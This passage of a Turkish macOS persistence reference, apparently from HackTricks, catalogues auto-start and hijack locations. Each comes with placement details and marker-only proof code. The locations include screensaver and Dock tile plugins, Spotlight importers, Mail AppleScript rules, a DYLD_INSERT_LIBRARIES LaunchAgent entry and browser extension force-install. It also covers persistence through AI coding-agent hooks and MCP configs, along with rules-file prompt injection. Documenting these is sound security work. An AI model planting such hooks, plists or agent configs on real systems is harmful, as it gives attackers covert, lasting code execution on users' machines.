- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    self = [super initWithFrame:frame isPreview:isPreview];
    if (self) {
        [self setAnimationTimeInterval:1/30.0];
    }
    return self;
}

- (void)startAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super startAnimation];
}

- (void)stopAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super drawRect:rect];
}

- (void)animateOneFrame
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return;
}

- (BOOL)hasConfigureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return NO;
}

- (NSWindow*)configureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```

### Spotlight Plugins

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)<sup>[[25]](#references)</sup>

- Sandbox'ı bypass etmek için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
  - Ancak uygulama sandbox'ı içinde kalırsınız
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Sandbox oldukça kısıtlı görünüyor

#### Location

- `~/Library/Spotlight/`
  - **Trigger**: Spotlight plugin'i tarafından yönetilen bir uzantıya sahip yeni bir dosya oluşturulur.
- `/Library/Spotlight/`
  - **Trigger**: Spotlight plugin'i tarafından yönetilen bir uzantıya sahip yeni bir dosya oluşturulur.
  - Root gerekir
- `/System/Library/Spotlight/`
  - **Trigger**: Spotlight plugin'i tarafından yönetilen bir uzantıya sahip yeni bir dosya oluşturulur.
  - Root gerekir
- `Some.app/Contents/Library/Spotlight/`
  - **Trigger**: Spotlight plugin'i tarafından yönetilen bir uzantıya sahip yeni bir dosya oluşturulur.
  - Yeni bir uygulama gerekir

#### Description & Exploitation

Spotlight, macOS'un yerleşik arama özelliğidir ve kullanıcılara **bilgisayarlarındaki verilere hızlı ve kapsamlı erişim** sağlamak üzere tasarlanmıştır.\
Bu hızlı arama özelliğini sağlamak için Spotlight, **özel bir veritabanı** tutar ve **çoğu dosyayı ayrıştırarak** bir dizin oluşturur; böylece hem dosya adlarında hem de içeriklerinde hızlı arama yapılabilir.<sup>[[25]](#references)</sup>

Spotlight'ın temel mekanizmasında, **'metadata server'** anlamına gelen 'mds' adlı merkezi bir süreç bulunur. Bu süreç, tüm Spotlight hizmetini yönetir. Buna ek olarak, farklı dosya türlerini dizine eklemek gibi çeşitli bakım görevlerini yerine getiren birden fazla 'mdworker' daemon'u vardır (`ps -ef | grep mdworker`). Bu görevler, Spotlight'ın çok çeşitli dosya biçimlerindeki içeriği anlamasını ve dizine eklemesini sağlayan Spotlight importer plugin'leri veya **".mdimporter bundles**" sayesinde gerçekleştirilir.

Plugin'ler veya **`.mdimporter`** bundles, daha önce belirtilen konumlarda bulunur. Yeni bir bundle'ın keşfedilmesi ve bir dosya türüyle eşleşmesi, ayrıca Spotlight'ın eşleşen bir dosyayı gerçekten dizine eklemesi gerekir; yalnızca bir bundle'ı kopyalamak, yüklendiğini kanıtlamaz. [Apple'ın MDImporter başvurusu](https://developer.apple.com/documentation/coreservices/file_metadata/mdimporter), yüklenme işleminin uygun bir dosyanın değiştirilmesiyle ilişkili olduğunu belirtir. macOS 26'da Spotlight importer çalıştırılması burada test edilmemiştir.

Yüklü tüm `mdimporters` öğelerini şu komutla bulabilirsiniz:

```bash
mdimport -L
Paths: id(501) (
    "/System/Library/Spotlight/iWork.mdimporter",
    "/System/Library/Spotlight/iPhoto.mdimporter",
    "/System/Library/Spotlight/PDF.mdimporter",
    [...]
```

Ve örneğin **/Library/Spotlight/iBooksAuthor.mdimporter**, bu tür dosyaları (`.iba` ve `.book` uzantıları ve diğerleri) ayrıştırmak için kullanılır:

```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
    0 => {
      "CFBundleTypeName" => "iBooks Author Book"
      "CFBundleTypeRole" => "MDImporter"
      "LSItemContentTypes" => [
        0 => "com.apple.ibooksauthor.book"
        1 => "com.apple.ibooksauthor.pkgbook"
        2 => "com.apple.ibooksauthor.template"
        3 => "com.apple.ibooksauthor.pkgtemplate"
      ]
      "LSTypeIsPackage" => 0
    }
  ]
[...]
 => {
      "UTTypeConformsTo" => [
        0 => "public.data"
        1 => "public.composite-content"
      ]
      "UTTypeDescription" => "iBooks Author Book"
      "UTTypeIdentifier" => "com.apple.ibooksauthor.book"
      "UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
      "UTTypeTagSpecification" => {
        "public.filename-extension" => [
          0 => "iba"
          1 => "book"
        ]
      }
    }
[...]
```

> [!CAUTION]
> Diğer `mdimporter`'ların Plist dosyalarını incelerseniz **`UTTypeConformsTo`** girdisini bulamayabilirsiniz. Bunun nedeni, bunun yerleşik bir _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) olması ve uzantı belirtmesinin gerekmemesidir.
>
> Ayrıca, sistemin varsayılan eklentileri her zaman önceliklidir; bu nedenle saldırgan yalnızca Apple'ın kendi `mdimporter`'ları tarafından dizine eklenmeyen dosyalara erişebilir.

Kendi importer'ınızı oluşturmak için şu projeyle başlayabilirsiniz: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer). Ardından adı değiştirin, **`CFBundleDocumentTypes`** değerini düzenleyin ve desteklemek istediğiniz uzantıyı desteklemesi için **`UTImportedTypeDeclarations`** ekleyip bunları **`schema.xml`** dosyasına yansıtın.\
Son olarak, işlenen uzantıya sahip bir dosya oluşturulduğunda payload'unuzu çalıştırmak için **`GetMetadataForFile`** fonksiyonunun kodunu **değiştirin**.

Son olarak, yeni **`.mdimporter`** dosyanızı derleyip önceki üç konumdan birine kopyalayın. **Logları izleyerek** veya **`mdimport -L`** komutunu çalıştırarak yüklenip yüklenmediğini kontrol edebilirsiniz.

> [!TIP]
> Importer sandbox'u çok kısıtlayıcı olsa da `mdworker`, dosyaları **ayrıcalıklı okuma erişimiyle** dizine ekler. Bu nedenle kötü amaçlı bir `.mdimporter`, TCC korumalı konumlardaki (Downloads, Pictures, Desktop, …) dosyaların *içeriğini* okuyabilir ve toplanan metadata'yı herhangi bir TCC istemi olmadan dışarı sızdırabilir — **"Sploitlight" TCC bypass (CVE-2025-31199)**; bu açık macOS Sequoia 15.4'te yamalanmıştır.<sup>[[55]](#references)</sup>

### ~~Tercih Bölmesi~~

> [!CAUTION]
> Artık çalışmıyor gibi görünüyor.

Yazı: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)<sup>[[26]](#references)</sup>

- Sandbox bypass için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
  - Belirli bir kullanıcı eylemi gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Açıklama

Artık çalışmıyor gibi görünüyor.<sup>[[26]](#references)</sup>

### Uygulama Betik Dosyaları

Yazı: [https://theevilbit.github.io/beyond/beyond_0010/](https://theevilbit.github.io/beyond/beyond_0010/)<sup>[[37]](#references)</sup>

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
  - Ancak hedeflenen uygulamanın kurulu olması ve kurban tarafından çalıştırılması/kullanılması gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

Yüklenmiş bir uygulama veya aracın gerçekten çalıştırdığı ve saldırganın değiştirebildiği **yorumlanan bir betik**. Dosya izinlerini ve çağrıldığı yolu doğrulayın; yalnızca bir `.sh` veya `.py` dosyası bulmak yeterli değildir. Apple'ın [code-signing kılavuzunda](https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/Procedures/Procedures.html) imzalı uygulama paketlerinin betikler dahil kaynakları mühürlediği belirtilir. Paket içindeki bir betiği düzenlemek bu mührü bozar ve paket doğrulanırken değişiklik algılanabilir veya engellenebilir. Homebrew başlatıcısı gibi harici bir betiğin imzalama ve güven davranışı farklıdır. Yazıdaki tarihsel örnekler şunlardır:

- **`/Applications/Sublime Text.app/Contents/MacOS/sublime.py`** – eski Sublime Text sürümlerinde kullanılan bir betik; dosyanın ve başlangıçta kullanımının kurulu sürüm için kontrol edilmesi gerekir. Test Mac'inde mevcut değildi.
- **`/opt/homebrew/bin/brew`** (Apple Silicon) veya **`/usr/local/bin/brew`** (Intel) – kuruluysa ve saldırgan tarafından yazılabiliyorsa, bu `brew` yolu çağrıldığında çalıştırılan bir Bash başlatıcısı. Test Mac'inde `/opt/homebrew/bin/brew` yazılabilir bir Bash betiğiydi; bu, yerel bir gözlemdir ve Homebrew izinlerine ilişkin genel bir kural değildir.
- Python uygulama paketindeki IDLE `idlemain.py` dosyası – yazmak için yönetici izni gerekebilir, ancak betik IDLE kullanıcısının kimliğiyle çalışır.
- **`/Library/Application Support/Wireshark/ChmodBPF/ChmodBPF`** – ilgili `org.wireshark.ChmodBPF` launchd işi kuruluysa root olarak çalıştırılan tarihsel bir shell betiği. Test Mac'inde betik ve iş mevcut değildi.

#### Açıklama ve Exploitation

Bazı araçlar ve uygulamalar, çalışma zamanında yorumlanan betikleri çalıştırır. Yazılabilir bir betik, imza doğrulaması, quarantine ve diğer kontroller izin verdiği sürece, ilgili çağıran bir sonraki çalıştırılışında eklenen komutları yürütebilir. İlk araştırmada 2019'daki birkaç kurulum gösterilmiştir; hedef sürümde yolları ve tetikleyicileri yeniden kontrol edin.<sup>[[37]](#references)</sup>

```python
# Marker-only injection test on a COPY of Homebrew's launcher. The relocated
# copy may fail its normal Homebrew logic; the marker checks script execution.
import pathlib, subprocess, tempfile

source = pathlib.Path('/opt/homebrew/bin/brew')
with tempfile.TemporaryDirectory(prefix='ht-script-copy-') as root:
    target = pathlib.Path(root) / 'brew'
    marker = pathlib.Path(root) / 'ran'
    lines = source.read_text().splitlines(keepends=True)
    target.write_text(lines[0] + '/usr/bin/touch ' + str(marker) + '\n' + ''.join(lines[1:]))
    target.chmod(0o700)
    subprocess.run([str(target), '--version'], capture_output=True, timeout=15)
    print('marker fired:', marker.exists())
```

Bu kopyalama testinde macOS 26.5.2'de `marker fired: True` sonucu alındı; özgün başlatıcıya dokunulmadı. Bu, ekleme noktasının kopyada çalıştığını kanıtlar; değiştirilmiş, imzalı bir uygulama paketinin veya gerçek bir Homebrew kurulumunun tüm başlatma kontrollerini geçeceğini değil.

### Dock Tile Eklentileri

Yazı: [https://theevilbit.github.io/beyond/beyond_0032/](https://theevilbit.github.io/beyond/beyond_0032/)<sup>[[38]](#references)</sup>

- Sandbox'ı atlatmak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
  - Eklentiyi bildiren bir uygulamanın keşfedilip kaydedilmesi ve Dock tarafından işlenmesi gerekir
  - Eklenti, app-sandbox yetkisi olmayan ve **library validation devre dışı bırakılmış** **Apple imzalı** bir yardımcı programa yüklenir. Atıf yapılan araştırmada bu yardımcı program Background Task Management arayüzünde gösterilmemiştir; hedef sürümde görünür olup olmadığı kontrol edilmelidir.
- TCC atlatma: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- **`<App>.app/Contents/PlugIns/<name>.docktileplugin`**; uygulamanın `Info.plist` dosyasındaki **`NSDockTilePlugIn`** anahtarıyla belirtilir. Eklentinin kendi `Info.plist` dosyasında **`NSPrincipalClass`** ayarlanır.

#### Açıklama ve Exploitation

Bir uygulama `NSDockTilePlugIn` bildirdiğinde Dock, belirtilen paketi giriş sırasında veya kutucuğu eklendiğinde **`com.apple.dock.external.extra`** XPC yardımcı programına (`...extra.arm64` Apple Silicon'da) yükleyebilir; uygulamanın kendisinin başlatılması gerekmez. Bunun için uygulamanın macOS tarafından keşfedilip kaydedilmesi ve kabul edilmesi gerekir. Yardımcı program **Apple imzalıdır**, `com.apple.security.app-sandbox` yetkisine sahip değildir ve `com.apple.security.cs.disable-library-validation` özelliğine sahiptir. Yükleme sırasında ana sınıfın **`setDockTile:`** yöntemi çağrılır; buradan daha sonraki olaylar için dağıtılmış bildirimlere (ör. `com.apple.screenIsLocked`) abone olunabilir.<sup>[[38]](#references)</sup>

macOS 26.5.2'de salt okunur `codesign` incelemesi, yardımcı programın Apple imzasını ve yetkilerini doğruladı; ayrıca yüklü birkaç uygulamanın `NSDockTilePlugIn` bildirdiği görüldü. Bu Mac'e yeni bir eklenti yüklenmedi veya yüklenerek çalıştırılmadı; dolayısıyla yeni yazılmış bir paketin bu sürümde çalışıp çalışmayacağı test edilmedi.

```bash
# Enumerate apps already shipping a Dock tile plugin (hijack / template targets)
for a in /Applications/*.app /System/Applications/*.app; do
  v=$(/usr/libexec/PlistBuddy -c 'Print :NSDockTilePlugIn' "$a/Contents/Info.plist" 2>/dev/null) \
    && echo "$a -> $v"
done
# e.g. on macOS 26: Calendar.app, App Store.app, System Settings.app, plus 3rd-party Warp.app / ChatGPT.app
```

```objc
// Principal class, built as MyPlugin.docktileplugin, placed in <App>.app/Contents/PlugIns/
// App Info.plist:    NSDockTilePlugIn = MyPlugin.docktileplugin
// Plugin Info.plist: NSPrincipalClass = MyDockPlugin , CFBundlePackageType = BNDL
@interface MyDockPlugin : NSObject <NSDockTilePlugIn>
@end
@implementation MyDockPlugin
- (void)setDockTile:(NSDockTile *)dockTile {
    system("touch /tmp/hacktricks_docktile");   // runs when the tile is added to the Dock / at login
}
@end
```

### Widgets (Notification Center / WidgetKit)

Yazı: [https://theevilbit.github.io/beyond/beyond_0033/](https://theevilbit.github.io/beyond/beyond_0033/)<sup>[[39]](#references)</sup>

- Sandbox'ı bypass etmek için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
  - Widget extension kendi **ayrı sürecinde** çalışır ve bir tane eklemek Background Task Management uyarısı oluşturmaz
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Config plist, TCC korumalı bir container içinde bulunur; bu nedenle dosyayı dışarıdan düzenlemek için Full Disk Access veya TCC bypass gerekir

#### Konum

- Widget extension bundle'ı: **`<App>.app/Contents/PlugIns/<Widget>.appex`**
- Etkin/kayıtlı widgets: **`~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist`** (anahtarlar `widgets.instances` ve `widgets.widgets`)

#### Açıklama ve Exploitation

Bir uygulamayla birlikte gelen WidgetKit extension, Notification Center tarafından yönetilen **kendi sürecinde** çalışır. `widgets.instances` içine bir örnek kaydetmek (`INIntent` verisi gömülü, base64 ile kodlanmış bir `NSKeyedArchiver` `CHSWidget` blob'u) ve NotificationCenter'ı yeniden başlatmak, widget'ın yüklenip `TimelineProvider`/intent kodunu çalıştırmasını sağlar.<sup>[[39]](#references)</sup>

```bash
# Inspect currently-registered widgets (file present on stock macOS)
plutil -p ~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist \
  | grep -iE "widgets?\." | head
```

### Mail.app Kuralları (Run AppleScript)

Yazı: [https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)<sup>[[42]](#references)</sup>

- sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
  - Ancak Mail.app'in bir hesapla yapılandırılmış ve çalışıyor olması gerekir; tetikleyici gelen bir e-postadır.
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Kuralları/script'leri Mail dışından düzenlemek için Mail'in kapatılması ve modern macOS'te Full Disk Access gerekebilir.

#### Konum

- **`~/Library/Mail/V10/MailData/SyncedRules.plist`** (yerel kurallar; Sonoma/Sequoia'da `V10`, daha yenilerde `V11`+)
- **`~/Library/Mobile Documents/com~apple~mail/Data/V10/MailData/ubiquitous_SyncedRules.plist`** (iCloud ile eşzamanlanan kurallar, önceliklidir)
- Kural etkinleştirme: **`RulesActiveState.plist`**; AppleScript payload: **`~/Library/Application Scripts/com.apple.mail/*.scpt`**

#### Açıklama ve Exploitation

Apple Mail **kuralı**, *"Run AppleScript"* eylemine sahip olabilir. Hazırlanmış bir **konu satırıyla** eşleşen ve saldırganın script'ini çalıştıran bir kural eklenerek saldırgan, sihirli e-posta geldiğinde Mail bağlamında **uzaktan tetiklenebilir, gizli** kod yürütme elde eder. Bu vektör, LaunchAgent/Login Item oluşturmadığı için birçok persistence tarayıcısından kaçabilir.<sup>[[42]](#references)</sup> Kuralı tetikleyici e-postayı **silecek** şekilde ayarlamak kanıtları gizler. Savunma ekipleri bunu doğrudan arayabilir:<sup>[[43]](#references)</sup>

```bash
# Enumerate Mail rules that invoke AppleScript
grep -A1 -i "AppleScript" ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null
plutil -p ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null | grep -iE "AppleScript|ShouldTransfer|Delete"
```

### Configuration Profiles (.mobileconfig)

Yazı: [https://www.jamf.com/blog/malicious-profiles-come/](https://www.jamf.com/blog/malicious-profiles-come/)<sup>[[44]](#references)</sup>

- Sandbox'ı bypass etmek için kullanışlı: [🔴](https://emojipedia.org/large-red-circle)
  - Modern macOS, System Settings → *Device Management* bölümünde **manuel kullanıcı onayı** gerektirir (`profiles install` komutunun MDM dışında sessizce çalıştırılması artık mümkün değildir)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- Yüklü profiller **`/Library/Managed Preferences/`** ve **`/var/db/ConfigurationProfiles/`** konumlarında bulunur; bir profil, `PayloadContent` dizisi içeren bir XML plist dosyasıdır.

#### Açıklama ve Exploitation

Bir `.mobileconfig`, doğrudan bir code-execution primitive değildir; ancak **güvenilir bir kök CA** (`com.apple.security.root`), **global veya PAC proxy** (`com.apple.proxy.*`), **yönetilen tercihler** (`com.apple.ManagedClient.preferences`) ya da kısıtlamalar gibi yapılandırmaları kalıcı hâle getirebilir. macOS 10.15 ve sonraki sürümlerde, Apple'ın [`PayloadRemovalDisallowed` tanımı](https://developer.apple.com/documentation/devicemanagement/toplevel), kaldırma parolası payload'ı olmayan **manuel olarak yüklenmiş** bir profilde bu ayarın `true` olarak belirlenmesinin, profili kaldırmak için **yönetici kimlik doğrulaması** gerektirdiğini belirtir; bu, profili kesin olarak kaldırılamaz hâle getirmez. MDM ile yüklenen profillerin yönetim ve kaldırma kuralları ayrıdır.<sup>[[44]](#references)</sup>

> [!WARNING]
> Standart bir configuration profile, gelişigüzel bir `LaunchDaemon`/`LaunchAgent` yükleyen bir **payload type** içermez. Bir daemon'u bu şekilde yüklemek için tam **MDM enrollment** ve bir management agent/script gerekir — `.mobileconfig` dosyasını launchd dağıtım mekanizması olarak değerlendirmeyin.

```bash
# Inspect installed profiles (user context)
profiles list            # per-user
sudo profiles show       # system (root)
```

### DYLD_INSERT_LIBRARIES Kalıcılığı

- Sandbox'i bypass etmek için kullanışlı: [🔴](https://emojipedia.org/large-red-circle)
  - dyld, SIP/platform ikilileri, hardened-runtime uygulamaları ve setuid hedefleri için `DYLD_*` değişkenlerini **temizler**; bu nedenle yalnızca korumasız süreçlere enjekte eder ve SIP'yi/hardened runtime'ı **bypass etmez**
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- Güvenilir yöntem: kötü amaçlı bir `LaunchAgent`/`LaunchDaemon` plist'i içindeki **`EnvironmentVariables`** sözlüğü (oturum açıldığında/sistem açıldığında çalışır)
- Kullanılmayan/tarihsel (yalnızca rapor amaçlı): **`~/.MacOSX/environment.plist`** (10.8'de kaldırıldı) ve **`/etc/launchd.conf`** (10.10'da kaldırıldı)

#### Açıklama ve Exploitation

Bir saldırgan `DYLD_INSERT_LIBRARIES` değişkenini kurban sürecinin ortamına ekleyebilirse dyld, saldırganın dylib'ini (constructor'ı çalışır) bu sürece yükler. Kalıcılık sağlayan yöntemde değişken bir LaunchAgent içine eklenir; böylece işin her başlatılışında yeniden enjekte edilir. `launchctl setenv DYLD_*` modern macOS'te filtrelendiğinden, bunun yerine değişkeni plist'e ekleyin.<sup>[[45]](#references)</sup>

```xml
<key>EnvironmentVariables</key>
<dict>
    <key>DYLD_INSERT_LIBRARIES</key>
    <string>/tmp/evil.dylib</string>
</dict>
```

Dylib injection/hijacking'in tüm mekanikleri için bkz.:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

### AI Coding Agent CLIs (hooks, MCP servers, rules files)

Writeups: [CVE-2025-59536 (Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)<sup>[[47]](#references)</sup>, [Rules File Backdoor (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)<sup>[[48]](#references)</sup>

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
  - Geliştiricinin ilgili agent'ı kullanması gerekir. Agent yapılandırmayı kabul ettiğinde, başlangıç komutları o kullanıcının yetkileriyle çalışır; workspace trust ve MCP onayı ürüne ve oturum moduna göre değişir.
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle) (kullanıcı olarak çalışır; terminal/agent'ın zaten sahip olduğu yetkileri devralır)

#### Konum

Açık hook ve MCP yapılandırma dosyaları, **geliştirici aracı kullandığında shell komutlarının veya alt süreçlerin çalışmasına neden olabilir** — ister kullanıcı başına global bir dosyadan (persistence), ister bir repoya commit edilmiş bir dosyadan (supply-chain) olsun. `CLAUDE.md`, `AGENTS.md`, `GEMINI.md` ve editor rules **agent'a yönelik talimatlardır**; okunduklarında shell komutlarının çalışması garanti değildir. Etkileri agent'ın davranışına ve araç izinlerine bağlıdır. Her ürünün güncel trust ve onay kurallarını kontrol edin.

- **Claude Code**
  - `~/.claude/settings.json`, proje `.claude/settings.json`, `.claude/settings.local.json` ve yalnızca root tarafından kullanılabilen **`/Library/Application Support/ClaudeCode/managed-settings.json`** (MDM/managed settings **kullanıcı tarafından geçersiz kılınamaz** → güçlü persistence)
  - `hooks` object — `PreToolUse`, `PostToolUse`, `UserPromptSubmit`, `Stop`, `SubagentStop`, `SessionStart`, `SessionEnd`, `Notification`, `PreCompact` event'lerinin her biri bir shell `command` çalıştırır
  - `statusLine.command` — status line'ı oluşturmak için çalıştırılan bir shell komutu (her oturumda)
  - `~/.claude.json` / proje `.mcp.json` içindeki MCP servers — alt süreç olarak başlatılan `command`+`args`
  - `CLAUDE.md` / `~/.claude/CLAUDE.md` — agent davranışına ve araç izinlerine bağlı olarak prompt injection denemesinde bulunabilecek talimatlar
- **OpenAI Codex CLI**: `~/.codex/config.toml` `[mcp_servers.*]` (alt süreç olarak başlatılan `command`/`args`); proje talimatları olan `AGENTS.md`
- **Gemini CLI**: `~/.gemini/settings.json` (`hooks`, MCP servers); `GEMINI.md`
- **Cursor**: `~/.cursor/hooks.json` (`beforeShellExecution`, `afterAgentResponse`, `stop`, … komutları çalıştırır); `.cursor/rules/`, `.cursorrules`, `~/.cursor/mcp.json`; GitHub Copilot `.github/copilot-instructions.md`

#### Açıklama ve Exploitation

Bir aktör hesabın kullanıcı genelindeki ayarlarını değiştirebiliyorsa, bu hesaptaki sonraki oturumlarda hook veya MCP komutları çalıştırılabilir. Repo tarafından denetlenen yapılandırma ayrı bir durumdur: [güncel Claude Code güvenlik belgeleri](https://code.claude.com/docs/en/security), etkileşimli bir workspace trust iletişim kutusu ile proje `.mcp.json` servers için ayrı bir onay istemi olduğunu açıklar. [İzin matrisi](https://code.claude.com/docs/en/permissions#what-runs-before-you-trust-a-folder), üst klasöre trust verildikten sonra hooks'un çalışabileceğini ve `claude -p`/SDK oturumlarında etkileşimli trust isteminin gösterilmediğini belirtir; bu etkileşimsiz modlarda proje MCP servers onay istemi olmadan bağlanır. CVE-2025-59536 olarak bildirilen trust öncesi proje hook bypass'ı [2025'te düzeltildi](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/); bunu mevcut varsayılan davranış olarak değerlendirmeyin. Dağıtım vektörleri arasında güvenliği ihlal edilmiş bir repo veya kötü amaçlı bir installer bulunabilir. Rules-file prompt injection, açık bir hook'a kıyasla daha az deterministiktir ve yine de araç onaylarına bağlıdır.<sup>[[47]](#references)</sup><sup>[[48]](#references)</sup>

Örnek kullanıcı-geneli Claude Code settings; test ederken bunu yalnızca geçici bir hesapta kullanın:

```json
{
  "hooks": {
    "SessionStart": [
      { "hooks": [ { "type": "command", "command": "touch /tmp/hacktricks_claude_hook" } ] }
    ]
  },
  "statusLine": { "type": "command", "command": "touch /tmp/hacktricks_statusline; echo HT" }
}
```

Kullanıcı genelindeki Codex MCP yapılandırmasına örnek:

```toml
[mcp_servers.evil]
command = "/bin/sh"
args = ["-c", "touch /tmp/hacktricks_codex_mcp; exec real-mcp-server"]
```

Örnek Cursor hook yapılandırması; kullanmadan önce yüklü sürümün şemasını kontrol edin:

```json
{ "version": 1, "hooks": { "beforeShellExecution": [ { "command": "touch /tmp/hacktricks_cursor_hook" } ] } }
```

```bash
# Defensive audit: which agent configs can auto-run commands?
ls -la .claude/settings*.json .mcp.json ~/.claude/settings.json ~/.claude.json \
       ~/.codex/config.toml ~/.gemini/settings.json ~/.cursor/hooks.json \
       ~/.cursor/mcp.json .cursor/rules .cursorrules .github/copilot-instructions.md 2>/dev/null
python3 -c 'import json;d=json.load(open("'"$HOME"'/.claude/settings.json"));print("claude hooks:",list(d.get("hooks",{}).keys()),"statusLine:",bool(d.get("statusLine")))' 2>/dev/null
```

### Tarayıcı Eklentileri (Chromium: Chrome / Brave / Edge)

Yazı: [Chrome external extensions](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)<sup>[[49]](#references)</sup>, [macOS'ta ExtensionInstallForcelist kötüye kullanımı](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)<sup>[[50]](#references)</sup>

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
  - Desteklenen bir tarayıcı ve yüklenmiş, etkin bir eklenti gerekir. macOS'taki External Extensions için kullanıcı onayı gerekir; yönetilen zorunlu yükleme için geçerli bir kurumsal politika gerekir.
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

> [!NOTE]
> Bu, **native messaging hosts**'tan farklıdır (yukarıdaki *Chrome native messaging hosts* bölümüne bakın). Buradaki kalıcılık, **otomatik yüklenen eklentinin** kendisidir.

#### Konum

- **External Extensions JSON** (tarayıcı başlangıcında keşfedilir, ardından macOS'ta etkinleştirme istemine tabi olur):
  - Chrome: `~/Library/Application Support/Google/Chrome/External Extensions/<extID>.json` (kullanıcı başına) veya `/Library/Application Support/Google/Chrome/External Extensions/` (tüm kullanıcılar)
  - Brave: `~/Library/Application Support/BraveSoftware/Brave-Browser/External Extensions/`
  - Edge: `~/Library/Application Support/Microsoft Edge/External Extensions/`
- Yönetilen tercihler / yapılandırma profili aracılığıyla **kurumsal politika ile zorunlu yükleme**:
  - `com.google.Chrome` anahtarı `ExtensionInstallForcelist` (Brave için `com.brave.Browser`, Edge için `com.microsoft.Edge`), `/Library/Managed Preferences/` konumundan veya yüklenmiş bir `.mobileconfig` dosyasından okunur

#### Açıklama ve Exploitation

Bunlar birbirinden farklı iki yükleme yöntemidir. Chrome'un [harici yükleme belgelerinde](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions) belirtildiği üzere, *External Extensions* dosyası aracılığıyla sunulan bir eklentiyi **Windows ve macOS kullanıcılarının onaylaması ve etkinleştirmesi gerekir**; yalnızca JSON dosyası yazıldığı için çalıştırılmaz. macOS'ta tüm kullanıcılar için yükleme yapılırken Chrome, harici eklenti dosyasının ayrıcalıksız kullanıcılar tarafından değiştirilmesini de engellemeyi gerektirir. Yönetilen `ExtensionInstallForcelist` veya `ExtensionSettings` politikası, kullanıcı etkileşimi olmadan bir eklentiyi yükleyip sabitleyebilir; [Google'ın Mac politika kılavuzu](https://support.google.com/chrome/a/answer/7517624) yönetilen yapılandırmayı açıklar ve zorunlu yüklenen eklentilerin kullanıcı tarafından kaldırılamayacağını belirtir. Bu bir politika dağıtım yöntemidir; kullanıcı başına çalışan bir `defaults write` kestirmesi değildir.<sup>[[49]](#references)</sup>

> [!WARNING]
> macOS'ta bir *External Extensions* JSON manifesti, yerel bir CRX'e değil, **Chrome Web Store** güncelleme URL'sine işaret etmelidir. Yönetilen politika dağıtımının kendi kurumsal ön koşulları vardır ve yönetilen, kendi barındırdığı bir güncelleme URL'sine izin verebilir. Test profilindeki yerel, paketlenmemiş bir eklenti için Chrome'un geliştirici modu `--load-extension=/path` anahtarı ayrı bir mekanizmadır; bu, bir External Extensions JSON dosyasını kendi kendine çalışır hâle getirmez. `Secure Preferences` dosyasına yazmayı, belgelenmiş kayıt yöntemlerinden herhangi biriyle eşdeğer saymayın.

```bash
# In a disposable browser account, propose a Chrome Web Store extension for enablement
ext_id='replace_with_32_character_web_store_id'
external_dir="$HOME/Library/Application Support/Google/Chrome/External Extensions"
mkdir -p "$external_dir"
cat > "$external_dir/$ext_id.json" <<'JSON'
{ "external_update_url": "https://clients2.google.com/service/update2/crx" }
JSON
```

